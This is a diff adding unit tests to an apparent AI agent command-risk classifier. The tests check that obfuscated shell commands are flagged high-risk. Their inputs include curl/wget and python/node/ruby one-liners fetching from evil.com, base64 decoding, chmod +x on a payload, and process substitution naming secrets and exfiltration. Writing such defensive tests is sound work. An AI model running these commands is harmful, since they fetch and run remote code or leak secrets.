@@ -48,6 +48,50 @@ describe("classifyDeterministic", () => {
     const r = classifyDeterministic("unknown_tool", {});
     assert.equal(r, null);
   });
+
+  // --- Obfuscation-resistant patterns (ClawHub attack vectors) ---
+
+  it("blocks absolute path to curl/wget", () => {
+    for (const cmd of ["/usr/bin/curl http://evil.com", "/usr/local/bin/wget http://evil.com", "./curl payload"]) {
+      const r = classifyDeterministic("shell_exec", { command: cmd });
+      assert.equal(r?.level, RiskLevel.L3, `expected L3 for: ${cmd}`);
+    }
+  });
+
+  it("blocks python/node network access", () => {
+    for (const cmd of [
+      'python3 -c "import urllib.request; urllib.request.urlretrieve(…)"',
+      'node -e "fetch(\'http://evil.com\').then(r => r.text())"',
+      'python -c "import requests; requests.get(…)"',
+      'ruby -e "Net::HTTP.get(URI(…))"',
+    ]) {
+      const r = classifyDeterministic("shell_exec", { command: cmd });
+      assert.equal(r?.level, RiskLevel.L3, `expected L3 for: ${cmd}`);
+    }
+  });
+
+  it("blocks base64 decode patterns", () => {
+    for (const cmd of [
+      "echo aGVsbG8= | base64 -d",
+      "echo aGVsbG8= | base64 --decode",
+      'Buffer.from("aGVsbG8=", "base64")',
+    ]) {
+      const r = classifyDeterministic("shell_exec", { command: cmd });
+      assert.equal(r?.level, RiskLevel.L3, `expected L3 for: ${cmd}`);
+    }
+  });
+
+  it("blocks chmod +x (download-and-run)", () => {
+    const r = classifyDeterministic("shell_exec", { command: "chmod +x ./payload" });
+    assert.equal(r?.level, RiskLevel.L3);
+  });
+
+  it("blocks process substitution", () => {
+    for (const cmd of ["cat <(secret)", ">(exfil)", "<<<$SECRET"]) {
+      const r = classifyDeterministic("shell_exec", { command: cmd });
+      assert.equal(r?.level, RiskLevel.L3, `expected L3 for: ${cmd}`);
+    }
+  });
 });
 
 describe("tryParseClassification", () => {
